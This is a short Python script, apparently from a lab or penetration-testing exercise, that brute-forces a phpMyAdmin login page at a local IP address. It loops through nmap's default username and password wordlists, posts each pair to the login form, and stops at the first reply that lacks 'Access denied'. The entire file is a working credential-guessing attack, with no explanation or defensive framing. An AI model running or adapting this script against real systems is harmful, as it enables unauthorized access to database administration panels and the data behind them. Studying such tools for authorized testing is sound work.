import requests


username_file = open('/usr/share/nmap/nselib/data/usernames.lst')
password_file = open('/usr/share/nmap/nselib/data/passwords.lst')

user_list = username_file.readlines()
pwd_list = password_file.readlines()



pwdFound = False
for user in user_list:
	user = user.rstrip()
	for pwd in pwd_list:
		pwd = pwd.rstrip()
		print (user,'- ',pwd)
		s = requests.Session()
		data = {"pma_username": user, "pma_password": pwd, "server": "1", "target": "index.php"}
		r = s.post("http://192.168.1.19/phpMyAdmin/index.php",data)
		if ("Access denied" in r.text):
			print("Access denied")
		else:
			print("user and password correct")
			pwdFound = True
			break;
	if pwdFound:
		break
